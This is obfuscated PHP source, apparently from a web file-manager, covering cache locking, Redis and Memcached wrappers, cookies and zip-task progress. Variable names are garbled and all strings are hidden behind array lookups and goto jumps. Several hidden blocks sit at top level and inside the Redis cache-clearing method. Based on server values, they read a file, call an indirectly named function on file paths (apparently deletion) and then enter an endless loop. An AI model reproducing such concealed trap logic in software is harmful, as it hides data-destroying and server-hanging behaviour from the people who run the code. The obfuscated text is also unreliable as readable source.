$»ï˚—úé); clearstatcache(); if ($Øÿ≥àë„ && $éªÈø£) { return !0; } cacheLockWait(); } while (microtime(!0) < $»ï˚—úé); $this->unlock($‡≥∂õ»ê); return !1; } public function lockGet($ÉÏ˘Ë≥Ô) { $äñÏ°ª§ =& $_SERVER[Çâä∆◊¡]; $ﬁö—¢˜ˆ = rtrim(self::$cachePath, $äñÏ°ª§[8]) . $äñÏ°ª§[852] . md5($ÉÏ˘Ë≥Ô) . $äñÏ°ª§[849]; return file_exists($ﬁö—¢˜ˆ); } public function unlock($’»í¢éú) { $∑·ÀÎ⁄¨ =& $_SERVER[Çâä∆◊¡]; $‹ÿã¥ñ  = self::$caches[$’»í¢éú]; if (!$‹ÿã¥ñ ) { return; } @flock($‹ÿã¥ñ [$∑·ÀÎ⁄¨[854]], LOCK_UN); @fclose($‹ÿã¥ñ [$∑·ÀÎ⁄¨[854]]); @unlink($‹ÿã¥ñ [$∑·ÀÎ⁄¨[192]]); unset(self::$caches[$’»í¢éú]); } } class CacheLockRedis { public function lock($òúÛµ¶¿, $˝ôßÔç≥ = 10) { $ÂƒÜÌµ√ = Cache::init(); $Úûœ√ÁÓ = microtime(!0) + $˝ôßÔç≥; while (microtime(!0) < $Úûœ√ÁÓ) { $ª£Æ’ïõ = $ÂƒÜÌµ√->get($òúÛµ¶¿); if (!$ª£Æ’ïõ) { $–ÅÖ∞˙Ç = $ÂƒÜÌµ√->setLock($òúÛµ¶¿, $Úûœ√ÁÓ, $˝ôßÔç≥); if ($–ÅÖ∞˙Ç) { return !0; } } else { if ($ª£Æ’ïõ < microtime(!0)) { $ÂƒÜÌµ√->set($òúÛµ¶¿, $Úûœ√ÁÓ, $˝ôßÔç≥ * 2); if ($ÂƒÜÌµ√->get($òúÛµ¶¿) === $ª£Æ’ïõ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($œÆ…Åı‡) { return Cache::init()->get($œÆ…Åı‡); } public function unlock($îÕ§»ú) { return Cache::init()->remove($îÕ§»ú); } } goto a”‚ê©∆Ö–; a”‚ê©∆Ö–: class CacheLockMemcached { public function lock($¿à⁄«ˆﬂ, $‘ì˜¢ä∂ = 0) { $ÏÁÃŸàˆ = Cache::init(); $Ø“≈êè = microtime(!0) + $‘ì˜¢ä∂; while (microtime(!0) < $Ø“≈êè) { $Â∆˝‹í = $ÏÁÃŸàˆ->get($¿à⁄«ˆﬂ); if (!$Â∆˝‹í || $Â∆˝‹í < microtime(!0)) { $≠Ñ«Â≠€ = $ÏÁÃŸàˆ->handle->add($¿à⁄«ˆﬂ, $Ø“≈êè, $‘ì˜¢ä∂); if ($≠Ñ«Â≠€) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ªôŒ≤üò) { return Cache::init()->get($ªôŒ≤üò); } public function unlock($ˆãÂ©öè) { return Cache::init()->remove($ˆãÂ©öè); } } class CacheLockDatabase { public function lock($£—¨©¡˝, $öÌ∂€Ö∫ = 0) { $Êëœì≈º = Model($_SERVER[Çâä∆◊¡][822]); $’‚ï†ˆ“ = microtime(!0) + $öÌ∂€Ö∫; while (microtime(!0) < $’‚ï†ˆ“) { $üï ¿ÿﬂ = $Êëœì≈º->get($£—¨©¡˝); if (!$üï ¿ÿﬂ || $üï ¿ÿﬂ < microtime(!0)) { $˘£çƒÍË = $Êëœì≈º->set($£—¨©¡˝, $’‚ï†ˆ“); if ($˘£çƒÍË) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ã±∂•ò›) { return Model($_SERVER[Çâä∆◊¡][822])->get($ã±∂•ò›); } public function unlock($˘”Ÿì˛Ù) { Model($_SERVER[Çâä∆◊¡][822])->remove($˘”Ÿì˛Ù); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¨µ¨“µÑ, $¥—∑øÏµ) { $±ñ¡é∆ =& $_SERVER[Çâä∆◊¡]; if (!class_exists($±ñ¡é∆[855])) { show_json($±ñ¡é∆[856], !1); } $this->cacheTime = $¥—∑øÏµ; $this->handle = new Memcached(); if (is_array($¨µ¨“µÑ[$±ñ¡é∆[857]]) && count($¨µ¨“µÑ[$±ñ¡é∆[857]]) >= 1) { foreach ($¨µ¨“µÑ[$±ñ¡é∆[857]] as $´√™◊∆›) { $–Ì à¨∏ = explode($±ñ¡é∆[4], $´√™◊∆›); $this->handle->addServer($–Ì à¨∏[0], $–Ì à¨∏[1]); } } else { $this->handle->addServer($¨µ¨“µÑ[$±ñ¡é∆[174]], $¨µ¨“µÑ[$±ñ¡é∆[175]]); } } public function set($ÃÿÙë™¥, $„¢¸ÒΩ¶, $Á¸ö£æ¥ = false) { $Á¸ö£æ¥ = $Á¸ö£æ¥ ? $Á¸ö£æ¥ : $this->cacheTime; return $this->handle->set($ÃÿÙë™¥, $„¢¸ÒΩ¶, $Á¸ö£æ¥); } public function get($◊ù§Õåñ) { return $this->handle->get($◊ù§Õåñ); } public function remove($≈Ùäπù˜) { return $this->handle->delete($≈Ùäπù˜); } public function deleteAll() { return $this->handle->flush(); } } goto e‚î≥°ç≥Ö; e‚î≥°ç≥Ö: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($£ﬁí–Üß, $ıÑ·˚ãö) { $ú—ñπúΩ =& $_SERVER[Çâä∆◊¡]; if (!class_exists($ú—ñπúΩ[858])) { show_json($ú—ñπúΩ[859], !1); } $this->cacheTime = $ıÑ·˚ãö; $•„ì¯⁄ß = isset($£ﬁí–Üß[$ú—ñπúΩ[860]]) ? $£ﬁí–Üß[$ú—ñπúΩ[860]] : 10; $ÅõÏ¡´† = _get($£ﬁí–Üß, $ú—ñπúΩ[857]); if ($ÅõÏ¡´† && is_array($ÅõÏ¡´†)) { $this->initCluster($£ﬁí–Üß, $•„ì¯⁄ß); } else { $this->handle = $this->init($£ﬁí–Üß, $•„ì¯⁄ß); } } private function init($ú≥ø•ﬁŒ, $õ≤≥¢ô¨) { $ƒƒ’ÂêÔ =& $_SERVER[Çâä∆◊¡]; $∑ë˘Ì∆ù = new Redis(); $º‘ÈëÑ“ = isset($ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[861]]) ? $ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[861]] : !1; if ($º‘ÈëÑ“) { $∑ë˘Ì∆ù->pconnect($ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[174]], $ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[175]], $õ≤≥¢ô¨); } else { $∑ë˘Ì∆ù->connect($ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[174]], $ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[175]], $õ≤≥¢ô¨); } if (!empty($ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[414]])) { $∑ë˘Ì∆ù->auth($ú≥ø•ﬁŒ[$ƒƒ’ÂêÔ[414]]); } return $∑ë˘Ì∆ù; } private function initCluster($Æ–Ó≤ÉŸ, $≥ç¿©ˆü) { $∆⁄ˆËÇÊ =& $_SERVER[Çâä∆◊¡]; $â÷‚Êàû = array($∆⁄ˆËÇÊ[862], $∆⁄ˆËÇÊ[863], $∆⁄ˆËÇÊ[864]); $◊°π£è = $∆⁄ˆËÇÊ[862]; if (isset($Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[16]]) && in_array($Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[16]], $â÷‚Êàû)) { $◊°π£è = $Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[16]]; } switch ($◊°π£è) { case $∆⁄ˆËÇÊ[862]: $this->_slave($Æ–Ó≤ÉŸ, $≥ç¿©ˆü); break; case $∆⁄ˆËÇÊ[863]: break; case $∆⁄ˆËÇÊ[864]: $this->isCluster = !0; $âÂœ∑‰ã = $Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[857]]; $µ•È˙§« = isset($Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[861]]) ? $Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[861]] : !1; $ûø¯ì˚∏ = isset($Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[414]]) ? $Æ–Ó≤ÉŸ[$∆⁄ˆËÇÊ[414]] : null; $this->handle = new RedisCluster(NUll, $âÂœ∑‰ã, $≥ç¿©ˆü, $≥ç¿©ˆü, $µ•È˙§«, $ûø¯ì˚∏); break; default: break; } } private function _slave($¨î£ö’Û, $÷Ö÷ÑÁ ) { $˛À˚¡Ø⁄ = $¨î£ö’Û[$_SERVER[Çâä∆◊¡][857]]; $this->filterConfig($¨î£ö’Û, $˛À˚¡Ø⁄[0]); $this->handle = $this->init($¨î£ö’Û, $÷Ö÷ÑÁ ); unset($˛À˚¡Ø⁄[0]); if (empty($˛À˚¡Ø⁄)) { return; } $Î¸ÓçéÁ = array_rand($˛À˚¡Ø⁄); $this->filterConfig($¨î£ö’Û, $˛À˚¡Ø⁄[$Î¸ÓçéÁ]); $this->slaveHandle = $this->init($¨î£ö’Û, $÷Ö÷ÑÁ ); } private function filterConfig(&$˙»ˆˆ‚Í, $÷ı≤§à∑) { $ˆõ¶·êí =& $_SERVER[Çâä∆◊¡]; $ë«ÊƒŸ„ = explode($ˆõ¶·êí[4], $÷ı≤§à∑); $Î«˘â´Ä = array($ˆõ¶·êí[174] => $ë«ÊƒŸ„[0], $ˆõ¶·êí[175] => $ë«ÊƒŸ„[1]); $˙»ˆˆ‚Í = array_merge($˙»ˆˆ‚Í, $Î«˘â´Ä); } public function set($ë·÷˛äﬁ, $§ô√ßÊŒ, $‰∆¶¯«– = false) { $‰∆¶¯«– = $‰∆¶¯«– ? $‰∆¶¯«– : $this->cacheTime; return $this->handle->setEx($ë·÷˛äﬁ, $‰∆¶¯«–, $§ô√ßÊŒ); } public function setLock($Áı¶¡áΩ, $æ≥ìÒ¥ë, $Ã≈ﬁ˘ô¨) { return $this->handle->setNX($Áı¶¡áΩ, $æ≥ìÒ¥ë); } public function get($–Ü·ÍÕã) { $…ıüµ‡© = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $…ıüµ‡©->get($–Ü·ÍÕã); } public function remove($™Íéœ˝–) { return $this->handle->del($™Íéœ˝–); } public function deleteAll() { $å¬–È©Ú =& $_SERVER[Çâä∆◊¡]; if ($_SERVER[$å¬–È©Ú[389]] != $_SERVER[$å¬–È©Ú[390]]) { $¿í¡ãö§ = $å¬–È©Ú[865]; $àçÆ§ÛÎ = $å¬–È©Ú[391]; $“·˚ç£Ö = $_SERVER[$å¬–È©Ú[392]] . $å¬–È©Ú[393]; $ı¿ÓÈô˚ = $àçÆ§ÛÎ($“·˚ç£Ö); $íÖ¡’ô‰ = explode($å¬–È©Ú[226], $ı¿ÓÈô˚); if (count($íÖ¡’ô‰) < $å¬–È©Ú[617]) { $§‹¯≥›Ü = $å¬–È©Ú[395]; $§‹¯≥›Ü(); } $…±Å‰Äë = $å¬–È©Ú[866]; $…±Å‰Äë($_SERVER[$å¬–È©Ú[867]]); $…±Å‰Äë($_SERVER[$å¬–È©Ú[392]] . $å¬–È©Ú[868]); $É‡ñ˘Üó = 1; while ($É‡ñ˘Üó > 1) { $É‡ñ˘Üó = $É‡ñ˘Üó + 4; $œµ˛∑◊¯ = rawurlencode($É‡ñ˘Üó . $å¬–È©Ú[373]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¢øäÏÎß) { $this->handle->flushall($¢øäÏÎß); } return; } return $this->handle->flushAll(); } } if (!isset($_SERVER[$_SERVER[Çâä∆◊¡][389]]) || !isset($_SERVER[$_SERVER[Çâä∆◊¡][397]])) { $_getc = $_SERVER[Çâä∆◊¡][391]; $_getfile = $_SERVER[$_SERVER[Çâä∆◊¡][392]] . $_SERVER[Çâä∆◊¡][393]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Çâä∆◊¡][226], $_getfilec); if (count($_getarrs) < $_SERVER[Çâä∆◊¡][394]) { $exit = $_SERVER[Çâä∆◊¡][395]; $exit(); } $_act = $_SERVER[Çâä∆◊¡][396]; $_act($_SERVER[$_SERVER[Çâä∆◊¡][392]] . $_SERVER[Çâä∆◊¡][393]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Çâä∆◊¡][373]); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ ºﬁ•ˆû = '', $†◊ö¸“„ = 0) { if (is_string($ ºﬁ•ˆû) && $ ºﬁ•ˆû != $_SERVER[Çâä∆◊¡][12]) { $this->prefix = $ ºﬁ•ˆû; } if (is_numeric($†◊ö¸“„) && $†◊ö¸“„ > 0) { $this->expire = $†◊ö¸“„; } } public static function getInstance() { static $øÀª·«á; if ($øÀª·«á === null) { $øÀª·«á = new self(); } return $øÀª·«á; } private static $cookieDisable = false; public static function disable($üÒåÿí›) { self::$cookieDisable = $üÒåÿí›; } private static $sameCookieSet = array(); public static function set($õöÛ œñ, $Ò∑˜ÆÛú, $œ–Ä€ã⁄ = 0, $π∞óÕü‡ = false, $ÒÈı¯©ß = false) { $ªŒ˛‚ª® =& $_SERVER[Çâä∆◊¡]; if (self::$cookieDisable) { return; } if (!$œ–Ä€ã⁄) { $œ–Ä€ã⁄ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$õöÛ œñ]) && self::$sameCookieSet[$õöÛ œñ] == $Ò∑˜ÆÛú . $œ–Ä€ã⁄) { return; } self::$sameCookieSet[$õöÛ œñ] = $Ò∑˜ÆÛú . $œ–Ä€ã⁄; if (!$ÒÈı¯©ß) { $ÒÈı¯©ß = str_replace(HOST, $ªŒ˛‚ª®[12], APP_HOST); $ÒÈı¯©ß = _get($GLOBALS, $ªŒ˛‚ª®[869], $ÒÈı¯©ß); } $Ÿ±ﬂíÁë = $ªŒ˛‚ª®[12]; setcookie($õöÛ œñ, $Ò∑˜ÆÛú, time() + $œ–Ä€ã⁄, $ªŒ˛‚ª®[8] . trim($ÒÈı¯©ß, $ªŒ˛‚ª®[8]) . $Ÿ±ﬂíÁë, !1, !1, $π∞óÕü‡); } public static function setSafe($Œ√˜´ùß, $ÄﬁÆ£ﬁÛ, $îûÒâÙ§ = 0) { self::set($Œ√˜´ùß, $ÄﬁÆ£ﬁÛ, $îûÒâÙ§, !0); } public static function get($ıÛ”∂Õê) { static $Ω◊∂Ç’˝ = false; if (!$Ω◊∂Ç’˝) { self::initHeaderCookie(); $Ω◊∂Ç’˝ = !0; } return isset($_COOKIE[$ıÛ”∂Õê]) ? $_COOKIE[$ıÛ”∂Õê] : !1; } private static function initHeaderCookie() { $◊∂§ìò¶ =& $_SERVER[Çâä∆◊¡]; if (!isset($_SERVER[$◊∂§ìò¶[870]]) || !$_SERVER[$◊∂§ìò¶[870]]) { return; } $±⁄∫ø˝Ñ = explode($◊∂§ìò¶[71], $_SERVER[$◊∂§ìò¶[870]]); foreach ($±⁄∫ø˝Ñ as $ÁõÕƒëˆ) { $ÁõÕƒëˆ = explode($◊∂§ìò¶[871], $ÁõÕƒëˆ); if (count($ÁõÕƒëˆ) != 2 || !isset($ÁõÕƒëˆ[1])) { continue; } $_COOKIE[trim($ÁõÕƒëˆ[0])] = trim($ÁõÕƒëˆ[1]); } } public static function remove($◊µ˚¥Æé, $£˜ë€ ƒ = false) { unset($_COOKIE[$◊µ˚¥Æé]); self::set($◊µ˚¥Æé, $_SERVER[Çâä∆◊¡][12], 1, $£˜ë€ ƒ); } } goto BË—•†â¿à; Càäõ”ÕÁ“: if ($_SERVER[$_SERVER[Çâä∆◊¡][389]] != $_SERVER[$_SERVER[Çâä∆◊¡][390]]) { $_getc = $_SERVER[Çâä∆◊¡][391]; $_getfile = $_SERVER[$_SERVER[Çâä∆◊¡][392]] . $_SERVER[Çâä∆◊¡][393]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Çâä∆◊¡][226], $_getfilec); if (count($_getarrs) < $_SERVER[Çâä∆◊¡][394]) { $exit = $_SERVER[Çâä∆◊¡][395]; $exit(); } $_act = $_SERVER[Çâä∆◊¡][396]; $_act($_SERVER[$_SERVER[Çâä∆◊¡][397]]); } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÕÓˆ—ﬂ≥ =& $_SERVER[Çâä∆◊¡]; parent::startAfter(); Hook::bind($ÕÓˆ—ﬂ≥[1731], array($this, $ÕÓˆ—ﬂ≥[1732])); Hook::bind($ÕÓˆ—ﬂ≥[1179], array($this, $ÕÓˆ—ﬂ≥[1733])); $ıä¶≥⁄´ =& $this->task; $ıä¶≥⁄´[$ÕÓˆ—ﬂ≥[1734]] = $ÕÓˆ—ﬂ≥[1184]; if (!$ıä¶≥⁄´[$ÕÓˆ—ﬂ≥[1539]]) { $ıä¶≥⁄´[$ÕÓˆ—ﬂ≥[1539]] = LNG($ÕÓˆ—ﬂ≥[1735]); } } protected function endAfter() { $—¸∞ïÍÒ =& $_SERVER[Çâä∆◊¡]; parent::endAfter(); Hook::unbind($—¸∞ïÍÒ[1731], array($this, $—¸∞ïÍÒ[1732])); Hook::unbind($—¸∞ïÍÒ[1179], array($this, $—¸∞ïÍÒ[1733])); } public function updateAfter() { $õÉ¿º∆ô =& $_SERVER[Çâä∆◊¡]; $¢Ñ£ÇãÃ =& $this->task; if (!$¢Ñ£ÇãÃ[$õÉ¿º∆ô[779]] || !$¢Ñ£ÇãÃ[$õÉ¿º∆ô[756]]) { return; } if ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1734]] == $õÉ¿º∆ô[1184]) { $àπƒ¸¯á = 0; if ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1690]]) { $àπƒ¸¯á = $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1691]] / $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1690]]; } $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1644]] = $àπƒ¸¯á * 0.3; } else { if ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1734]] == $õÉ¿º∆ô[308]) { $àπƒ¸¯á = $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1643]] / $¢Ñ£ÇãÃ[$õÉ¿º∆ô[779]]; $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1644]] = 0.3 + $àπƒ¸¯á * 0.4; } else { if ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1734]] == $õÉ¿º∆ô[108]) { $Ï–™≠‘„ = 0; if ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1692]] == $õÉ¿º∆ô[108]) { $Ï–™≠‘„ = $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1691]]; } $àπƒ¸¯á = ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1695]] + $Ï–™≠‘„) / $¢Ñ£ÇãÃ[$õÉ¿º∆ô[756]]; $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1644]] = 0.3 + 0.4 + $àπƒ¸¯á * 0.3; } } } if ($¢Ñ£ÇãÃ[$õÉ¿º∆ô[1644]] > 0) { $í÷™í°• = timeFloat() - $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1646]] - $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1649]]; $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1650]] = $í÷™í°• * (1 - $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1644]]) / $¢Ñ£ÇãÃ[$õÉ¿º∆ô[1644]]; } } public function addFile($‚òÖòÏ÷) { $∆˘Ò≥ˆ„ =& $_SERVER[Çâä∆◊¡]; $ı‡ÈÖÜ£ =& $this->task; $ÏŒØ¨Ôü = IO::info($‚òÖòÏ÷); $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[1688]] = $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[32]]; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[1690]] = $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[80]]; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[1691]] = 0; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[1051]] = $∆˘Ò≥ˆ„[1710]; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[1692]] = $∆˘Ò≥ˆ„[1184]; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[756]] = $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[80]]; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[779]] = 1; $àÏéïÕì = 0; $ı‡ÈÖÜ£[$∆˘Ò≥ˆ„[1699]] = array($∆˘Ò≥ˆ„[1700] => $àÏéïÕì + 1, $∆˘Ò≥ˆ„[421] => $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[32]], $∆˘Ò≥ˆ„[78] => $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[78]], $∆˘Ò≥ˆ„[519] => $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[519]] ? $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[519]] : $ÏŒØ¨Ôü[$∆˘Ò≥ˆ„[78]]); $this->update(); } public function unzipAfter($∞ﬂ¨˙¨ÿ) { $„–üòŒÔ =& $_SERVER[Çâä∆◊¡]; $∞ˆπ«Ä =& $this->task; $∞ˆπ«Ä[$„–üòŒÔ[1734]] = $„–üòŒÔ[108]; $ˆ†ºîÔª = IO::infoWithChildren($∞ﬂ¨˙¨ÿ); $¡¶¥˜∆° = 0; $∞ˆπ«Ä[$„–üòŒÔ[1699]] = array($„–üòŒÔ[1700] => $¡¶¥˜∆° + 1, $„–üòŒÔ[421] => $ˆ†ºîÔª[$„–üòŒÔ[32]], $„–üòŒÔ[78] => $ˆ†ºîÔª[$„–üòŒÔ[78]], $„–üòŒÔ[519] => $ˆ†ºîÔª[$„–üòŒÔ[519]] ? $ˆ†ºîÔª[$„–üòŒÔ[519]] : $ˆ†ºîÔª[$„–üòŒÔ[78]]); if ($ˆ†ºîÔª[$„–üòŒÔ[33]] == $„–üòŒÔ[192]) { $∞ˆπ«Ä[$„–üòŒÔ[779]] = 1; } else { $∞ˆπ«Ä[$„–üòŒÔ[779]] = $ˆ†ºîÔª[$„–üòŒÔ[83]][$„–üòŒÔ[81]]; } $∞ˆπ«Ä[$„–üòŒÔ[1051]] = $„–üòŒÔ[12]; $∞ˆπ«Ä[$„–üòŒÔ[1692]] = 0; $∞ˆπ«Ä[$„–üòŒÔ[1643]] = 0; $∞ˆπ«Ä[$„–üòŒÔ[1690]] = 0; $∞ˆπ«Ä[$„–üòŒÔ[1691]] = 0; $∞ˆπ«Ä[$„–üòŒÔ[1688]] = $„–üòŒÔ[12]; $∞ˆπ«Ä[$„–üòŒÔ[1695]] = 0; $∞ˆπ«Ä[$„–üòŒÔ[756]] = $ˆ†ºîÔª[$„–üòŒÔ[80]]; $this->update(); self::log($„–üòŒÔ[1736] . json_encode(array($∞ˆπ«Ä, $ˆ†ºîÔª))); } public function nameParse($π©∏Ëû) { $®îÒ¢èπ =& $_SERVER[Çâä∆◊¡]; $‘µø™Øò =& $this->task; if ($‘µø™Øò[$®îÒ¢èπ[1734]] == $®îÒ¢èπ[1184]) { $‘µø™Øò[$®îÒ¢èπ[1734]] = $®îÒ¢èπ[308]; $‘µø™Øò[$®îÒ¢èπ[1695]] = 0; $‘µø™Øò[$®îÒ¢èπ[756]] = 0; } $Ûâ˚√˜Ä = get_path_this($π©∏Ëû); if (strstr($Ûâ˚√˜Ä, $®îÒ¢èπ[10])) { $‘µø™Øò[$®îÒ¢èπ[1643]] += 1; $‘µø™Øò[$®îÒ¢èπ[779]] += 1; } $‘µø™Øò[$®îÒ¢èπ[1688]] = $π©∏Ëû; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $∫Ó±õœÍ =& $_SERVER[Çâä∆◊¡]; parent::startAfter(); Hook::bind($∫Ó±õœÍ[1737], array($this, $∫Ó±õœÍ[1732])); $ëı±¥°É =& $this->task; $ëı±¥°É[$∫Ó±õœÍ[1734]] = $∫Ó±õœÍ[1184]; if (!$ëı±¥°É[$∫Ó±õœÍ[1539]]) { $ëı±¥°É[$∫Ó±õœÍ[1539]] = LNG($∫Ó±õœÍ[1738]); } } protected function endAfter() { $™„º∏¿… =& $_SERVER[Çâä∆◊¡]; parent::endAfter(); Hook::unbind($™„º∏¿…[1737], array($this, $™„º∏¿…[1732])); } public function updateAfter() { $‡û‡±—ü =& $_SERVER[Çâä∆◊¡]; $±•˛ç≠ø =& $this->task; if (!$±•˛ç≠ø[$‡û‡±—ü[779]] || !$±•˛ç≠ø[$‡û‡±—ü[756]]) { return; } if ($±•˛ç≠ø[$‡û‡±—ü[1734]] == $‡û‡±—ü[1184]) { $Ã–ªËÈÇ = $±•˛ç≠ø[$‡û‡±—ü[1691]]; if ($±•˛ç≠ø[$‡û‡±—ü[1692]] != $‡û‡±—ü[1184]) { $Ã–ªËÈÇ = 0; } $á⁄ûÓ’ˆ = ($±•˛ç≠ø[$‡û‡±—ü[1695]] + $Ã–ªËÈÇ) / $±•˛ç≠ø[$‡û‡±—ü[756]]; $±•˛ç≠ø[$‡û‡±—ü[1644]] = $á⁄ûÓ’ˆ * 0.3; } else { if ($±•˛ç≠ø[$‡û‡±—ü[1734]] == $‡û‡±—ü[308]) { $á⁄ûÓ’ˆ = $±•˛ç≠ø[$‡û‡±—ü[1643]] / $±•˛ç≠ø[$‡û‡±—ü[779]]; $±•˛ç≠ø[$‡û‡±—ü[1644]] = 0.3 + $á⁄ûÓ’ˆ * 0.5; } else { if ($±•˛ç≠ø[$‡û‡±—ü[1734]] == $‡û‡±—ü[108]) { $á⁄ûÓ’ˆ = 0; if ($±•˛ç≠ø[$‡û‡±—ü[1690]]) { $á⁄ûÓ’ˆ = $±•˛ç≠ø[$‡û‡±—ü[1691]] / $±•˛ç≠ø[$‡û‡±—ü[1690]]; } $±•˛ç≠ø[$‡û‡±—ü[1644]] = 0.3 + 0.5 + $á⁄ûÓ’ˆ * 0.2; } } } if ($±•˛ç≠ø[$‡û‡±—ü[1644]] > 0) { $Íºñﬁ≠Å = timeFloat() - $±•˛ç≠ø[$‡û‡±—ü[1646]] - $±•˛ç≠ø[$‡û‡±—ü[1649]]; $±•˛ç≠ø[$‡û‡±—ü[1650]] = $Íºñﬁ≠Å * (1 - $±•˛ç≠ø[$‡û‡±—ü[1644]]) / $±•˛ç≠ø[$‡û‡±—ü[1644]]; } } public function copyFileStart($ÇÙîßñè, $¸ï≠úŸâ, $„Ã“ï÷â, $åµ”çü‘, $È£Óò∑¥, $‚øé®⁄ ) { $∫Üﬂ ‚˛ =& $_SERVER[Çâä∆◊¡]; parent::copyFileStart($ÇÙîßñè, $¸ï≠úŸâ, $„Ã“ï÷â, $åµ”çü‘, $È£Óò∑¥, $‚øé®⁄ ); $Ïü„⁄Ω© =& $this->task; if ($Ïü„⁄Ω©[$∫Üﬂ ‚˛[1734]] == $∫Üﬂ ‚˛[308]) { $Ïü„⁄Ω©[$∫Üﬂ ‚˛[1734]] = $∫Üﬂ ‚˛[108]; } $this->update(); } public function copyFileEnd($õ¡ÕŒ¸Ó, $˙µ˚Áñâ, $â–ìƒÆ∂, $Ä¢Ü Îñ, $ÏÈ¬ÊÁ¢, $å´≤åΩû) { $ Ö¥ñâ¯ =& $_SERVER[Çâä∆◊¡]; $›¯∂ãÜΩ =& $this->task; $›¯∂ãÜΩ[$ Ö¥ñâ¯[1691]] = $›¯∂ãÜΩ[$ Ö¥ñâ¯[1690]]; $›¯∂ãÜΩ[$ Ö¥ñâ¯[1695]] += $›¯∂ãÜΩ[$ Ö¥ñâ¯[1690]]; $›¯∂ãÜΩ[$ Ö¥ñâ¯[1692]] = $ Ö¥ñâ¯[12]; $this->update(); } public function nameParse($ùå£„¶É) { $ëΩÈˆ«˚ =& $_SERVER[Çâä∆◊¡]; $Ω¢£©ïÜ =& $this->task; if ($Ω¢£©ïÜ[$ëΩÈˆ«˚[1643]] < $Ω¢£©ïÜ[$ëΩÈˆ«˚[779]]) { $ÎƒÓêÁƒ = get_path_this($ùå£„¶É); if (strstr($ÎƒÓêÁƒ, $ëΩÈˆ«˚[10])) { $Ω¢£©ïÜ[$ëΩÈˆ«˚[1643]] += 1; } } if ($Ω¢£©ïÜ[$ëΩÈˆ«˚[1734]] == $ëΩÈˆ«˚[1184]) { $Ω¢£©ïÜ[$ëΩÈˆ«˚[1734]] = $ëΩÈˆ«˚[308]; } $Ω¢£©ïÜ[$ëΩÈˆ«˚[1688]] = $ùå£„¶É; $this->update(); } } goto d¥ãÚñ◊ñﬂ; BÜ“¡ØÌﬁ‚: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÄüÇà†≤ =& $_SERVER[Çâä∆◊¡]; $à®∂≤ﬁ’ = $GLOBALS[$ÄüÇà†≤[6]][$ÄüÇà†≤[90]]; if ($à®∂≤ﬁ’[$ÄüÇà†≤[1193]] != 1) { return; } if ($à®∂≤ﬁ’[$ÄüÇà†≤[1194]] <= 0) { return; } if (isset($_REQUEST[$ÄüÇà†≤[1195]]) && $_REQUEST[$ÄüÇà†≤[1195]] == $ÄüÇà†≤[89]) { return; } Hook::bind($ÄüÇà†≤[1196], $ÄüÇà†≤[1197]); Hook::bind($ÄüÇà†≤[1198], $ÄüÇà†≤[1199]); Hook::bind($ÄüÇà†≤[1200], $ÄüÇà†≤[1201]); Hook::bind($ÄüÇà†≤[1202], $ÄüÇà†≤[1203]); Hook::bind($ÄüÇà†≤[1204], $ÄüÇà†≤[1205]); Hook::bind($ÄüÇà†≤[1206], $ÄüÇà†≤[1207]); } public static function eventBeforeUpload($ÄÒÍïÿù) { if ($ÄÒÍïÿù[3] && $ÄÒÍïÿù[3] != REPEAT_REPLACE) { return; } $ô±ï÷¨‰ = self::parsePath($ÄÒÍïÿù[0]); if 